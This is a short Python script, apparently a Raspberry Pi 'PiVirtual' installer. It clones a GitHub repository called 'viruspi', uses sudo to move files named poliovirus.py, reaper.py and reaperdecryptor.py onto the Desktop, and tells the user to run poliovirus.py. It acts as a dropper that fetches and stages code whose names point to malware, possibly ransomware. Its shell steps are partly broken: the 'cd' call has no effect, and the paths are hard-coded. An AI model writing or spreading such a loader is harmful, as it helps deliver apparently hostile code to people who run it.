#!/usr/bin/python3


import os
import time

print('Welcome to PiVirtual!')
input('Press any key to begin the installation!')



cmd = 'git clone https://github.com/TimothytheTapeworm/viruspi.git'
os.system(cmd)

time.sleep (5)

cmd2 = 'cd viruspi'
os.system(cmd2)

time.sleep(2)

cmd3 = 'sudo mv /home/pi/Desktop/viruspi/poliovirus.py /home/pi/Desktop/poliovirus.py'
os.system(cmd3)

cmd4 = 'sudo mv /home/pi/Desktop/viruspi/reaper.py /home/pi/Desktop/reaper.py'
os.system(cmd4)

cmd5 = 'sudo mv /home/pi/Desktop/viruspi/reaperdecryptor.py /home/pi/Desktop/reaperdecryptor.py'
os.system(cmd5)

print('Almost there!')
print('Enter the viruspi directory and run the command python3 poliovirus.py to complete installation!')
